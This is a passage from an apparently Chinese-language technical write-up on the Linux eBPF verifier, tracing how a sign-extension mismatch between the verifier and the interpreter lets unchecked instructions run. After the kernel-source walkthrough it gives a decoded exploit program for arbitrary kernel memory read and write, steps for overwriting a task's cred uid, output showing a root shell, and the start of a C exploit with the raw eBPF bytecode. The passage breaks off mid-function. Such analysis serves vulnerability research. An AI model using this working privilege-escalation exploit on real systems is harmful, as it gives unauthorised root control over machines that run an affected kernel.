|| insn[1].src_reg != 0 || insn[1].off != 0) &#123; verbose("invalid bpf_ld_imm64 insn\n"); return -EINVAL; &#125;//最后一条指令，下一条指令确定为0 if (insn-&gt;src_reg == 0) /* valid generic load 64-bit imm */ goto next_insn;[2] if (insn-&gt;src_reg != BPF_PSEUDO_MAP_FD) &#123; verbose("unrecognized bpf_ld_imm64 insn\n"); return -EINVAL; &#125; f = fdget(insn-&gt;imm); map = __bpf_map_get(f); if (IS_ERR(map)) &#123; verbose("fd %d is not pointing to valid bpf_map\n", insn-&gt;imm); return PTR_ERR(map); &#125; /* store map pointer inside BPF_LD_IMM64 instruction */ insn[0].imm = (u32) (unsigned long) map; insn[1].imm = ((u64) (unsigned long) map) &gt;&gt; 32; /* check whether we recorded this map already */ for (j = 0; j &lt; env-&gt;used_map_cnt; j++) if (env-&gt;used_maps[j] == map) &#123; fdput(f); goto next_insn; &#125; if (env-&gt;used_map_cnt &gt;= MAX_USED_MAPS) &#123; fdput(f); return -E2BIG; &#125; /* hold the map. If the program is rejected by verifier, * the map will be released by release_maps() or it * will be used by the valid program until it's unloaded * and all maps are released in free_bpf_prog_info() */ map = bpf_map_inc(map, false); if (IS_ERR(map)) &#123; fdput(f); return PTR_ERR(map); &#125; env-&gt;used_maps[env-&gt;used_map_cnt++] = map; fdput(f);next_insn: insn++; i++; &#125; &#125; /* now all pseudo BPF_LD_IMM64 instructions load valid * 'struct bpf_map *' into a register instead of user map_fd. * These pointers will be used later by verifier to validate map access. */ return 0;&#125; do_check下面进行check过程中最核心的do_check函数，首先可以看到整个程序处于一个for死循环中，其中维护了一系列寄存器，其寄存器变量定义和初始化如下，可以看到寄存器的值是一个int类型，并且有一个枚举的type变量，type类型包括未定义、位置、立即数、指针等，初始化时会将全部寄存器类型定义为未定义，赋值为0。第十个寄存器定义为栈指针，第一个定义为内容指针。 123456789101112131415161718192021222324252627282930313233343536373839404142struct reg_state &#123; enum bpf_reg_type type; union &#123; /* valid when type == CONST_IMM | PTR_TO_STACK */ int imm; /* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE | * PTR_TO_MAP_VALUE_OR_NULL */ struct bpf_map *map_ptr; &#125;;&#125;;static void init_reg_state(struct reg_state *regs)&#123; int i; for (i = 0; i &lt; MAX_BPF_REG; i++) &#123; regs[i].type = NOT_INIT; regs[i].imm = 0; regs[i].map_ptr = NULL; &#125; /* frame pointer */ regs[BPF_REG_FP].type = FRAME_PTR; /* 1st arg to a function */ regs[BPF_REG_1].type = PTR_TO_CTX;&#125;/* types of values stored in eBPF registers */enum bpf_reg_type &#123; NOT_INIT = 0, /* nothing was written into register */ UNKNOWN_VALUE, /* reg doesn't contain a valid pointer */ PTR_TO_CTX, /* reg points to bpf_context */ CONST_PTR_TO_MAP, /* reg points to struct bpf_map */ PTR_TO_MAP_VALUE, /* reg points to map element value */ PTR_TO_MAP_VALUE_OR_NULL,/* points to map elem value or NULL */ FRAME_PTR, /* reg == frame_pointer */ PTR_TO_STACK, /* reg == frame_pointer + imm */ CONST_IMM, /* constant integer value */&#125;; check函数的处理方式是逐条处理，按照不同的类型分别做check。由于指令比较多，不一样赘述了，下面从两个攻击角度去展示程序是如何检测的。 Q&amp;A1：for循环如何会检查结束并退出退出指令定义为BPF_EXIT，这个指令属于BPF_JMP大类，可以看到当指令为该条指令的时候会执行一个pop_stack操作，而当这个函数的返回值是负数的时候，用break跳出死循环。否则会用这个作为取值的位置去执行下一条指令。对于这个操作的理解是，当遇到条件跳转的时候，程序会默认执行一个分支，然后将另外一个分支压入stack中，当一个分支执行结束后，去检查另外一个分支，类似于迷宫问题解决里走到思路的退栈操作。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566 else if (class == BPF_JMP) &#123; u8 opcode = BPF_OP(insn-&gt;code); if (opcode == BPF_CALL) &#123; if (BPF_SRC(insn-&gt;code) != BPF_K || insn-&gt;off != 0 || insn-&gt;src_reg != BPF_REG_0 || insn-&gt;dst_reg != BPF_REG_0) &#123; verbose("BPF_CALL uses reserved fields\n"); return -EINVAL; &#125; err = check_call(env, insn-&gt;imm); if (err) return err; &#125; else if (opcode == BPF_JA) &#123; if (BPF_SRC(insn-&gt;code) != BPF_K || insn-&gt;imm != 0 || insn-&gt;src_reg != BPF_REG_0 || insn-&gt;dst_reg != BPF_REG_0) &#123; verbose("BPF_JA uses reserved fields\n"); return -EINVAL; &#125; insn_idx += insn-&gt;off + 1; continue; &#125; else if (opcode == BPF_EXIT) &#123; if (BPF_SRC(insn-&gt;code) != BPF_K || insn-&gt;imm != 0 || insn-&gt;src_reg != BPF_REG_0 || insn-&gt;dst_reg != BPF_REG_0) &#123; verbose("BPF_EXIT uses reserved fields\n"); return -EINVAL; &#125; /* eBPF calling convetion is such that R0 is used * to return the value from eBPF program. * Make sure that it's readable at this time * of bpf_exit, which means that program wrote * something into it earlier */ err = check_reg_arg(regs, BPF_REG_0, SRC_OP); if (err) return err; if (is_pointer_value(env, BPF_REG_0)) &#123; verbose("R0 leaks addr as return value\n"); return -EACCES; &#125;process_bpf_exit: insn_idx = pop_stack(env, &amp;prev_insn_idx); if (insn_idx &lt; 0) &#123; break; &#125; else &#123; do_print_state = true; continue; &#125; &#125; else &#123; err = check_cond_jmp_op(env, insn, &amp;insn_idx); if (err) return err; &#125; &#125; 查看一下pop_stack函数，函数中先判断env-&gt;head是否为0，如果是就代表没有未检查的路径了。否则将保持的state恢复。 123456789101112131415161718static int pop_stack(struct verifier_env *env, int *prev_insn_idx)&#123; struct verifier_stack_elem *elem; int insn_idx; if (env-&gt;head == NULL) return -1; memcpy(&amp;env-&gt;cur_state, &amp;env-&gt;head-&gt;st, sizeof(env-&gt;cur_state)); insn_idx = env-&gt;head-&gt;insn_idx; if (prev_insn_idx) *prev_insn_idx = env-&gt;head-&gt;prev_insn_idx; elem = env-&gt;head-&gt;next; kfree(env-&gt;head); env-&gt;head = elem; env-&gt;stack_size--; return insn_idx;&#125; 然后看一下条件分支的处理代码check_cond_jmp_op，我们可以看到这个检查将跳转分成两种，第一种[1]处是JEQ和JNE，并且是比较的值是立即数的情况，此时就判断立即数是不是等于要比较的寄存器，进行直接跳转。第二种[2]处是其他情况，均需把off+1的值压入栈中作为另一条分支。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107static int check_cond_jmp_op(struct verifier_env *env, struct bpf_insn *insn, int *insn_idx)&#123; struct reg_state *regs = env-&gt;cur_state.regs; struct verifier_state *other_branch; u8 opcode = BPF_OP(insn-&gt;code); int err; if (opcode &gt; BPF_EXIT) &#123; verbose("invalid BPF_JMP opcode %x\n", opcode); return -EINVAL; &#125; if (BPF_SRC(insn-&gt;code) == BPF_X) &#123; if (insn-&gt;imm != 0) &#123; verbose("BPF_JMP uses reserved fields\n"); return -EINVAL; &#125; /* check src1 operand */ err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP); if (err) return err; if (is_pointer_value(env, insn-&gt;src_reg)) &#123; verbose("R%d pointer comparison prohibited\n", insn-&gt;src_reg); return -EACCES; &#125; &#125; else &#123; if (insn-&gt;src_reg != BPF_REG_0) &#123; verbose("BPF_JMP uses reserved fields\n"); return -EINVAL; &#125; &#125; /* check src2 operand */ err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP); if (err) return err; /* detect if R == 0 where R was initialized to zero earlier */[1] if (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp; (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp; regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp; regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123; if (opcode == BPF_JEQ) &#123; /* if (imm == imm) goto pc+off; * only follow the goto, ignore fall-through */ *insn_idx += insn-&gt;off; return 0; &#125; else &#123; /* if (imm != imm) goto pc+off; * only follow fall-through branch, since * that's where the program will go */ return 0; &#125; &#125;[2] other_branch = push_stack(env, *insn_idx + insn-&gt;off + 1, *insn_idx); if (!other_branch) return -EFAULT; /* detect if R == 0 where R is returned value from bpf_map_lookup_elem() */ if (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp; insn-&gt;imm == 0 &amp;&amp; (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp; regs[insn-&gt;dst_reg].type == PTR_TO_MAP_VALUE_OR_NULL) &#123; if (opcode == BPF_JEQ) &#123; /* next fallthrough insn can access memory via * this register */ regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE; /* branch targer cannot access it, since reg == 0 */ other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM; other_branch-&gt;regs[insn-&gt;dst_reg].imm = 0; &#125; else &#123; other_branch-&gt;regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE; regs[insn-&gt;dst_reg].type = CONST_IMM; regs[insn-&gt;dst_reg].imm = 0; &#125; &#125; else if (is_pointer_value(env, insn-&gt;dst_reg)) &#123; verbose("R%d pointer comparison prohibited\n", insn-&gt;dst_reg); return -EACCES; &#125; else if (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp; (opcode == BPF_JEQ || opcode == BPF_JNE)) &#123; if (opcode == BPF_JEQ) &#123; /* detect if (R == imm) goto * and in the target state recognize that R = imm */ other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM; other_branch-&gt;regs[insn-&gt;dst_reg].imm = insn-&gt;imm; &#125; else &#123; /* detect if (R != imm) goto * and in the fall-through state recognize that R = imm */ regs[insn-&gt;dst_reg].type = CONST_IMM; regs[insn-&gt;dst_reg].imm = insn-&gt;imm; &#125; &#125; if (log_level) print_verifier_state(env); return 0;&#125; Q&amp;A2：能否进行直接的内存读写？内存读写需要用到的指令主要是BPF_LDX_MEM或者BPF_STX_MEM两类。如下，当r7和r8的值可控就可以达到内存任意写，类似于mov dword ptr[r7],r8这样的操作。 1STX_MEM_DW(8,7,0x0,0x0) 接下来分析一下ST和LD有哪些限制，check_reg_arg[1]处检查寄存器是否访问寄存器的序号是否超过最大值10，如果是SRC_OP检查是否是未初始化的值。否则检查是否要写的地方是rbp，并将要写的寄存器值置为UNKOWN。然后是check_mem_access检查，该函数会根据读写类型检查dst或src的值是否为栈指针、数据包指针、map指针，否则不允许读写。： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990 else if (class == BPF_LDX) &#123; enum bpf_reg_type src_reg_type; /* check for reserved fields is already done */ /* check src operand */[1] err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP); if (err) return err;[1] err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP_NO_MARK); if (err) return err; src_reg_type = regs[insn-&gt;src_reg].type; /* check that memory (src_reg + off) is readable, * the state of dst_reg will be updated by this func */[2] err = check_mem_access(env, insn-&gt;src_reg, insn-&gt;off, BPF_SIZE(insn-&gt;code), BPF_READ, insn-&gt;dst_reg); if (err) return err; if (BPF_SIZE(insn-&gt;code) != BPF_W) &#123; insn_idx++; continue; &#125; if (insn-&gt;imm == 0) &#123; /* saw a valid insn * dst_reg = *(u32 *)(src_reg + off) * use reserved 'imm' field to mark this insn */ insn-&gt;imm = src_reg_type; &#125; else if (src_reg_type != insn-&gt;imm &amp;&amp; (src_reg_type == PTR_TO_CTX || insn-&gt;imm == PTR_TO_CTX)) &#123; /* ABuser program is trying to use the same insn * dst_reg = *(u32*) (src_reg + off) * with different pointer types: * src_reg == ctx in one branch and * src_reg == stack|map in some other branch. * Reject it. */ verbose("same insn cannot be used with different pointers\n"); return -EINVAL; &#125; &#125; else if (class == BPF_STX) &#123; enum bpf_reg_type dst_reg_type; if (BPF_MODE(insn-&gt;code) == BPF_XADD) &#123; err = check_xadd(env, insn); if (err) return err; insn_idx++; continue; &#125; /* check src1 operand */[1] err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP); if (err) return err; /* check src2 operand */[1] err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP); if (err) return err; dst_reg_type = regs[insn-&gt;dst_reg].type; /* check that memory (dst_reg + off) is writeable */[2] err = check_mem_access(env, insn-&gt;dst_reg, insn-&gt;off, BPF_SIZE(insn-&gt;code), BPF_WRITE, insn-&gt;src_reg); if (err) return err; if (insn-&gt;imm == 0) &#123; insn-&gt;imm = dst_reg_type; &#125; else if (dst_reg_type != insn-&gt;imm &amp;&amp; (dst_reg_type == PTR_TO_CTX || insn-&gt;imm == PTR_TO_CTX)) &#123; verbose("same insn cannot be used with different pointers\n"); return -EINVAL; &#125; &#125; 以上情况，如果采用MOV这样的赋值指令去读写的话，寄存器类型会判定为IMM，而拒绝。另外一种是用BPF_FUNC_map_lookup_elem这样的函数调用返回，再赋给某个寄存器，然后再进行读写。而这种方法会在赋值时被设定为UNKNOWN而拒绝读写。 __bpf_prog_run以上就是对于加载指令的全部检查，可以看到我们能想到的内存读写方法都是会被检测出来的。真正执行的时候代码在__bpf_prog_run中，其中可以看到所谓的各个寄存器和栈只是这个函数的局部变量： 1234567static unsigned int __bpf_prog_run(void *ctx, const struct bpf_insn *insn)&#123; u64 stack[MAX_BPF_STACK / sizeof(u64)]; u64 regs[MAX_BPF_REG], tmp; static const void *jumptable[256] = &#123; [0 ... 255] = &amp;&amp;default_label, /* Now overwrite non-defaults ... */ 程序维护了一个跳表，根据opcode来进行跳转，而函数中没有任何check，具体实现代码十分简单，就不赘述了。 可以发现程序的寄存器变量与check中的寄存器变量不太一样，此时是unsigned long long类型。 漏洞利用利用整数扩展问题绕过bpf_check本漏洞的原因是check函数和真正的函数的执行方法不一致导致的，主要问题是二者寄存器值类型不同。先看下面一段EBPF指令： 123456[0]: ALU_MOV_K(0,9,0x0,0xffffffff)[1]: JMP_JNE_K(0,9,0x2,0xffffffff)[2]: ALU64_MOV_K(0,0,0x0,0x0)[3]: JMP_EXIT(0,0,0x0,0x0)[4]: ...... ...... 第0条指令是将0xffffffff放入r9寄存器中，当在do_check函数中时，在[1]处会直接将0xffffffff复制给r9，并将type赋值为IMM。在第[1]条指令，比较r9==0xffffffff，相等时就执行[2]、[3]，否则跳到[4]。根据前文对退出的分析，这个地方在do_check看来是一个恒等式，不会将另外一条路径压入stack，直接退出。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778 if (class == BPF_ALU || class == BPF_ALU64) &#123; err = check_alu_op(env, insn); if (err) return err； &#125;static int check_alu_op(struct verifier_env *env, struct bpf_insn *insn)&#123; struct reg_state *regs = env-&gt;cur_state.regs; u8 opcode = BPF_OP(insn-&gt;code); int err; if (opcode == BPF_END || opcode == BPF_NEG) &#123; ... ... &#125; /* check src operand */ ....... /* check dest operand */ ....... &#125; else if (opcode == BPF_MOV) &#123; if (BPF_SRC(insn-&gt;code) == BPF_X) &#123; if (insn-&gt;imm != 0 || insn-&gt;off != 0) &#123; verbose("BPF_MOV uses reserved fields\n"); return -EINVAL; &#125; /* check src operand */ err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP); if (err) return err; &#125; else &#123; if (insn-&gt;src_reg != BPF_REG_0 || insn-&gt;off != 0) &#123; verbose("BPF_MOV uses reserved fields\n"); return -EINVAL; &#125; &#125; /* check dest operand */ err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP); if (err) return err; if (BPF_SRC(insn-&gt;code) == BPF_X) &#123; if (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123; /* case: R1 = R2 * copy register state to dest reg */ regs[insn-&gt;dst_reg] = regs[insn-&gt;src_reg]; &#125; else &#123; if (is_pointer_value(env, insn-&gt;src_reg)) &#123; verbose("R%d partial copy of pointer\n", insn-&gt;src_reg); return -EACCES; &#125; regs[insn-&gt;dst_reg].type = UNKNOWN_VALUE; regs[insn-&gt;dst_reg].map_ptr = NULL; &#125;[1] &#125; else &#123; /* case: R = imm * remember the value we stored into this reg */ regs[insn-&gt;dst_reg].type = CONST_IMM; regs[insn-&gt;dst_reg].imm = insn-&gt;imm; &#125; &#125; else if (opcode &gt; BPF_END) &#123; verbose("invalid BPF_ALU opcode %x\n", opcode); return -EINVAL; &#125; else &#123; /* all other ALU ops: and, sub, xor, add, ... */ ...... &#125; return 0;&#125; 而在真实执行的过程中，由于寄存器类型不一样，在执行第二条跳转语句时存在问题： 123456JMP_JNE_K: if (DST != IMM) &#123; insn += insn-&gt;off; CONT_JMP; &#125; CONT; 而翻译成汇编就非常明显了： 123456789101112131415161718192021222324252627282930313233343536373839 0xffffffff81173bad &lt;__bpf_prog_run+1565&gt; mov qword ptr [rbp + rax*8 - 0x278], rdi 0xffffffff81173bb5 &lt;__bpf_prog_run+1573&gt; movzx eax, byte ptr [rbx] 0xffffffff81173bb8 &lt;__bpf_prog_run+1576&gt; jmp qword ptr [r12 + rax*8] ↓ 0xffffffff81173e7b &lt;__bpf_prog_run+2283&gt; movzx eax, byte ptr [rbx + 1] 0xffffffff81173e7f &lt;__bpf_prog_run+2287&gt; movsxd rdx, dword ptr [rbx + 4] ► 0xffffffff81173e83 &lt;__bpf_prog_run+2291&gt; and eax, 0xf 0xffffffff81173e86 &lt;__bpf_prog_run+2294&gt; cmp qword ptr [rbp + rax*8 - 0x278], rdx 0xffffffff81173e8e &lt;__bpf_prog_run+2302&gt; je __bpf_prog_run+5036 &lt;0xffffffff8117493c&gt; 0xffffffff81173e94 &lt;__bpf_prog_run+2308&gt; movsx rax, word ptr [rbx + 2] 0xffffffff81173e99 &lt;__bpf_prog_run+2313&gt; lea rbx, [rbx + rax*8 + 8] 0xffffffff81173e9e &lt;__bpf_prog_run+2318&gt; movzx eax, byte ptr [rbx]─────────────────────────────────────[ STACK ]──────────────────────────────────────00:0000│ rsp 0xffff88000048fa30 ◂— 0xcc01:0008│ 0xffff88000048fa38 ◂— 0x002:0010│ 0xffff88000048fa40 —▸ 0xffff88000fabb500 ◂— 0x003:0018│ 0xffff88000048fa48 —▸ 0xffffffff811afebc (zone_statistics+124) ◂— 0xbec35d5d415c415b04:0020│ 0xffff88000048fa50 ◂— 0x105:0028│ 0xffff88000048fa58 —▸ 0xffff88000c46e780 ◂— 0x17c06:0030│ 0xffff88000048fa60 —▸ 0xffff88000048fc18 —▸ 0xffff88000048fc70 —▸ 0xffff88000a550f00 ◂— 0x20000000107:0038│ 0xffff88000048fa68 —▸ 0xffff88000048fb30 —▸ 0xffff88000048fc70 —▸ 0xffff88000a550f00 ◂— 0x200000001───────────────────────────────────[ BACKTRACE ]──────────────────────────────────── ► f 0 ffffffff81173e83 __bpf_prog_run+2291 f 1 ffffffff817272bc sk_filter_trim_cap+108 f 2 ffffffff817272bc sk_filter_trim_cap+108 f 3 ffffffff817b824a unix_dgram_sendmsg+586 f 4 ffffffff817b824a unix_dgram_sendmsg+586 f 5 ffffffff816f4728 sock_sendmsg+56 f 6 ffffffff816f4728 sock_sendmsg+56 f 7 ffffffff816f47c5 sock_write_iter+133 f 8 ffffffff8120cf59 __vfs_write+201 f 9 ffffffff8120cf59 __vfs_write+201 f 10 ffffffff8120d5d9 vfs_write+169pwndbg&gt; i r rdxrdx 0xffffffffffffffff -1pwndbg&gt; x /gx $rbx+40xffffc90000099034: 0x000000b7ffffffffpwndbg&gt; 可以看到汇编指令被翻译成movsxd，而此时会发生符号扩展，由原来的0xffffffff扩展成0xffffffffffffffff，再次比较的时候二者并不相同，造成了跳转到[4]处执行，从而绕过了对[4]以后EBPF程序的校验。 漏洞利用当[4]以后的程序不经过check以后，就可以对[4]的内容进行构造了，利用真正执行时无类型就可以达到内存任意读写了。 利用本人写的小工具对已有的EBPF程序进行解码，可以看到程序逻辑如下： 1234567891011121314151617181920212223242526272829303132333435363738394041[0]: ALU_MOV_K(0,9,0x0,0xffffffff)[1]: JMP_JNE_K(0,9,0x2,0xffffffff)[2]: ALU64_MOV_K(0,0,0x0,0x0)[3]: JMP_EXIT(0,0,0x0,0x0)[4]: LD_IMM_DW(1,9,0x0,0x3)[5]: maybe padding[6]: ALU64_MOV_X(9,1,0x0,0x0)[7]: ALU64_MOV_X(10,2,0x0,0x0)[8]: ALU64_ADD_K(0,2,0x0,0xfffffffc)[9]: ST_MEM_W(0,10,0xfffc,0x0)[10]: JMP_CALL(0,0,0x0,0x1)[11]: JMP_JNE_K(0,0,0x1,0x0)[12]: JMP_EXIT(0,0,0x0,0x0)[13]: LDX_MEM_DW(0,6,0x0,0x0)[14]: ALU64_MOV_X(9,1,0x0,0x0)[15]: ALU64_MOV_X(10,2,0x0,0x0)[16]: ALU64_ADD_K(0,2,0x0,0xfffffffc)[17]: ST_MEM_W(0,10,0xfffc,0x1)[18]: JMP_CALL(0,0,0x0,0x1)[19]: JMP_JNE_K(0,0,0x1,0x0)[20]: JMP_EXIT(0,0,0x0,0x0)[21]: LDX_MEM_DW(0,7,0x0,0x0)[22]: ALU64_MOV_X(9,1,0x0,0x0)[23]: ALU64_MOV_X(10,2,0x0,0x0)[24]: ALU64_ADD_K(0,2,0x0,0xfffffffc)[25]: ST_MEM_W(0,10,0xfffc,0x2)[26]: JMP_CALL(0,0,0x0,0x1)[27]: JMP_JNE_K(0,0,0x1,0x0)[28]: JMP_EXIT(0,0,0x0,0x0)[29]: LDX_MEM_DW(0,8,0x0,0x0)[30]: ALU64_MOV_X(0,2,0x0,0x0)[31]: ALU64_MOV_K(0,0,0x0,0x0)[32]: JMP_JNE_K(0,6,0x3,0x0)[33]: LDX_MEM_DW(7,3,0x0,0x0)[34]: STX_MEM_DW(3,2,0x0,0x0)[35]: JMP_EXIT(0,0,0x0,0x0)[36]: JMP_JNE_K(0,6,0x2,0x1)[37]: STX_MEM_DW(10,2,0x0,0x0)[38]: JMP_EXIT(0,0,0x0,0x0)[39]: STX_MEM_DW(8,7,0x0,0x0)[40]: JMP_EXIT(0,0,0x0,0x0) 下面对这个程序进行分析： 首先，[0]~[3]已经分析过了下面对后续指令进行分析： 第[4]~[5]条语句可用由上面的map知识得到，第五条语句是填充语句，当执行完后，会将map的地址存放在r9寄存器中。 [6]~[13]语句的类C代码如下，即调用BPF_FUNC_map_lookup_elem(map_add,idx)，并将返回值存到r6寄存器中，即r6=map[0] 12345678[6]: r1=r9[7]: r2=rbp[8]: r2 = r2-4[9]: [rbp+(-4)] = 0 (idx)[10]: call BPF_FUNC_map_lookup_elem[11]: if r0== 0:[12]: exit(0)[13]: r6=[r0] [14]~[21]同理，将r7=map[1]。[22]~[29]为r8=map[2]，而map的内容可以由用户态传入。 最后[30]~[40]分为三个不分，map[0] = 0时，将map[1]地址所指的内容，写到map[3]中，用户态可以通过读map[3]来得到这个值，因此是内存任意读功能。map[0]=1时，将rbp的值写入map[3]中，由此可以泄露内核栈地址。map[0]=2时，将map[3]的值写入map[2]地址中，由此是个内存任意写。 1234567891011[30]: ALU64_MOV_X(0,2,0x0,0x0) r2=r0[31]: ALU64_MOV_K(0,0,0x0,0x0) r0=0[32]: JMP_JNE_K(0,6,0x3,0x0) if r6!=0 jmpto 36[33]: LDX_MEM_DW(7,3,0x0,0x0) r3 = [r7][34]: STX_MEM_DW(3,2,0x0,0x0) [r2]=r3[35]: JMP_EXIT(0,0,0x0,0x0) exit(0)[36]: JMP_JNE_K(0,6,0x2,0x1) if r6!=1 jmpto 39[37]: STX_MEM_DW(10,2,0x0,0x0) [r2]=rbp[38]: JMP_EXIT(0,0,0x0,0x0) exit(0)[39]: STX_MEM_DW(8,7,0x0,0x0) [r7]=r8[40]: JMP_EXIT(0,0,0x0,0x0) exit(0) 漏洞利用也非常简单，首先利用2功能读取内核栈地址，这样通过栈地址&amp; ~(0x4000 - 1)可以得到内核线程task_struct的地址，而这个数据结构中的cred指针指向该线程的cred数据块，但是这个偏移会随内核编译的改变而改变，从gdb中看这个结构的方法是： 12pwndbg&gt; p &amp;(*(struct task_struct *)0).cred$2 = (const struct cred **) 0x9b8 &lt;irq_stack_union+2488&gt; 因此，利用0功能可以读出cred的地址，同理找出cred中的uid偏移 12pwndbg&gt; p &amp;(*(struct cred *)0).uid$3 = (kuid_t *) 0x4 &lt;irq_stack_union+4&gt; 再利用2功能向该地址里写入0，就可以成功提权了。 123456789101112/ $ iduid=1000(chal) gid=1000(chal) groups=1000(chal)/ $ ./upstream44mapfd finishedbpf_prog_load finishedsocketpair finishedsetsockopt finishedtask_struct = ffff880006d90000uidptr = ffff8800004313c4spawning root shelluid=0(root) gid=0(root) euid=1000(chal) egid=1000(chal) groups=1000(chal)/ $ 相关代码EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;linux/bpf.h&gt;#include &lt;linux/unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/un.h&gt;#include &lt;sys/stat.h&gt;#include &lt;stdint.h&gt;#define PHYS_OFFSET 0xffff880000000000#define CRED_OFFSET 0x9b8 //0x5f8#define UID_OFFSET 4#define LOG_BUF_SIZE 65536#define PROGSIZE 328 //-32int sockets[2];int mapfd, progfd;char *__prog = "\xb4\x09\x00\x00\xff\xff\xff\xff" "\x55\x09\x02\x00\xff\xff\xff\xff" "\xb7\x00\x00\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x18\x19\x00\x00\x03\x00\x00\x00" "\x00\x00\x00\x00\x00\x00\x00\x00" "\xbf\x91\x00\x00\x00\x00\x00\x00" "\xbf\xa2\x00\x00\x00\x00\x00\x00" "\x07\x02\x00\x00\xfc\xff\xff\xff" "\x62\x0a\xfc\xff\x00\x00\x00\x00" "\x85\x00\x00\x00\x01\x00\x00\x00" "\x55\x00\x01\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x79\x06\x00\x00\x00\x00\x00\x00" "\xbf\x91\x00\x00\x00\x00\x00\x00" "\xbf\xa2\x00\x00\x00\x00\x00\x00" "\x07\x02\x00\x00\xfc\xff\xff\xff" "\x62\x0a\xfc\xff\x01\x00\x00\x00" "\x85\x00\x00\x00\x01\x00\x00\x00" "\x55\x00\x01\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x79\x07\x00\x00\x00\x00\x00\x00" "\xbf\x91\x00\x00\x00\x00\x00\x00" "\xbf\xa2\x00\x00\x00\x00\x00\x00" "\x07\x02\x00\x00\xfc\xff\xff\xff" "\x62\x0a\xfc\xff\x02\x00\x00\x00" "\x85\x00\x00\x00\x01\x00\x00\x00" "\x55\x00\x01\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x79\x08\x00\x00\x00\x00\x00\x00" "\xbf\x02\x00\x00\x00\x00\x00\x00" "\xb7\x00\x00\x00\x00\x00\x00\x00" "\x55\x06\x03\x00\x00\x00\x00\x00" "\x79\x73\x00\x00\x00\x00\x00\x00" "\x7b\x32\x00\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x55\x06\x02\x00\x01\x00\x00\x00" "\x7b\xa2\x00\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x7b\x87\x00\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00";char bpf_log_buf[LOG_BUF_SIZE];static int bpf_prog_load(enum bpf_prog_type prog_type, const struct bpf_insn *insns, int prog_len, const char *license, int kern_version) &#123; union bpf_attr attr = &#123; .prog_type = prog_type, .insns = (__u64)insns, .insn_cnt = prog_len / sizeof(struct bpf_insn), .license = (__u64)license, .log_buf = (__u64)bpf_log_buf, .log_size = LOG_BUF_SIZE, .log_level = 1, &#125;; attr.kern_version = kern_version; bpf_log_buf[0] = 0; return syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr));&#125;static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size, int max_entries) &#123; union bpf_attr attr = &#123; .map_type = map_type, .key_size = key_size, .value_size = value_size, .max_entries = max_entries &#125;; return syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr));&#125;static int bpf_update_elem(uint64_t key, uint64_t value) &#123; union bpf_attr attr = &#123; .map_fd = mapfd, .key = (__u64)&amp;key, .value = (__u64)&amp;value, .flags = 0, &#125;; return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr));&#125;static int bpf_lookup_elem(void *key, void *value) &#123; union bpf_attr attr = &#123; .map_fd = mapfd, .key = (__u64)key, .value = (__u64)value, &#125;; return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr));&#125;static void __exit(char *err) &#123; fprintf(stderr, "error: %s\n", err); exit(-1);&#125;static void prep(void) &#123; mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3); if (mapfd &lt; 0) __exit(strerror(errno)); puts("mapfd finished"); progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, (struct bpf_insn *)__prog, PROGSIZE, "GPL", 0); if (progfd &lt; 0) __exit(strerror(errno)); puts("bpf_prog_load finished"); if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)) __exit(strerror(errno)); puts("socketpair finished"); 